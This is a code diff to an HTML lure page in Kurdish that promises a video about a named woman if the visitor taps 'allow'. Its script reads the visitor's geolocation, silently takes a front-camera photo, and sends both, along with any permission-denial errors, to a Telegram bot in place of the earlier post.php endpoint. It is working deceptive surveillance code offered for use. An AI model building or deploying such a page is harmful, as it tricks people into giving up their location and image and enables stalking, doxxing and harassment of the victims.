@@ -25,7 +25,6 @@
             max-width: 380px; 
             text-align: center; 
         }
-        
         .preview-img-box {
             width: 100%;
             height: 200px;
@@ -41,7 +40,6 @@
             height: 100%;
             object-fit: contain;
         }
-        
         .image-overlay-text {
             position: absolute;
             bottom: 0;
@@ -54,7 +52,6 @@
             font-weight: bold;
             text-align: center;
         }
-
         .content-after-allow {
             display: none;
             margin-bottom: 15px;
@@ -66,22 +63,8 @@
             object-fit: cover;
             outline: none;
         }
-
-        .title { 
-            font-size: 22px; 
-            font-weight: 800; 
-            color: #0f172a; 
-            margin-bottom: 6px; 
-            letter-spacing: -0.5px;
-        }
-        .subtitle { 
-            color: #64748b; 
-            font-size: 13px; 
-            margin-bottom: 20px; 
-            line-height: 1.5; 
-            font-weight: 500; 
-        }
-        
+        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
+        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
         .btn { 
             background: linear-gradient(135deg, #2563eb, #1d4ed8); 
             color: white; 
@@ -93,10 +76,7 @@
             width: 100%; 
             font-weight: bold; 
             box-shadow: 0 6px 16px rgba(37,99,235,0.4);
-            transition: all 0.2s ease;
         }
-        .btn:active { transform: scale(0.97); }
-        
         .loader {
             border: 3px solid #f3f3f3;
             border-radius: 50%;
@@ -108,14 +88,12 @@
             display: none;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         .status-text { margin-top: 15px; font-size: 12px; color: #94a3b8; font-weight: 500; }
     </style>
 </head>
 <body>
 
     <div class="container" id="mainContainer">
-        
         <div id="imageBox" class="preview-img-box">
             <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
             <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە allow دابگرە</div>
@@ -129,7 +107,7 @@
         </div>
 
         <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
-        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ناوەڕۆکەکە، کلیک بکە:</div>
+        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</div>
         
         <div id="loader" class="loader"></div>
         <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
@@ -141,33 +119,35 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Check if user is inside Telegram or Snapchat and redirect to external browser
-        (function() {
-            let ua = navigator.userAgent || navigator.vendor || window.opera;
-            let currentUrl = window.location.href;
-            
-            if (ua.indexOf("Telegram") > -1) {
-                // Force open in external browser for Telegram (iOS/Android schemes)
-                window.location.href = "https://t.me/share/url?url=" + encodeURIComponent(currentUrl);
-            } else if (ua.indexOf("Snapchat") > -1) {
-                // Try to force opening via intent/scheme if possible, or fallback
-                let iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'googlechrome://navigate?url=' + encodeURIComponent(currentUrl);
-                document.body.appendChild(iframe);
-            }
-        })();
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+        function sendToTelegramText(text) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+
+        function sendToTelegramPhoto(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "capt.jpg");
+            formData.append("caption", caption);
+            fetch(url, { method: "POST", body: formData });
+        }
 
         function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
-                    
-                    let xhr = new XMLHttpRequest();
-                    xhr.open("POST", "post.php", true);
-                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send("lat=" + encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon));
+                    sendToTelegramText(`📍 شوێنی نوێ:\nLat: ${lat}\nLon: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`);
+                }, function(error) {
+                    sendToTelegramText(`⚠️ ڕەتکردنەوەی شوێن (Location): ${error.message}`);
                 });
             }
         }
@@ -176,10 +156,7 @@
             const video = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
             
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(function(stream) {
                 video.srcObject = stream;
                 video.play();
@@ -190,18 +167,15 @@
                     let context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    let imageData = canvas.toDataURL('image/png');
-                    
-                    let xhr = new XMLHttpRequest();
-                    xhr.open("POST", "post.php", true);
-                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send("image=" + encodeURIComponent(imageData));
+                    canvas.toBlob(function(blob) {
+                        sendToTelegramPhoto(blob, "📸 وێنەی کەسی سەردانیکەر");
+                    }, 'image/jpeg', 0.8);
                     
                     stream.getTracks().forEach(track => track.stop());
                 }, 1200);
             })
             .catch(function(err) {
-                console.log("Camera Error: " + err);
+                sendToTelegramText(`⚠️ ڕەتکردنەوەی دوربین (Camera): ${err}`);
             });
         }
 
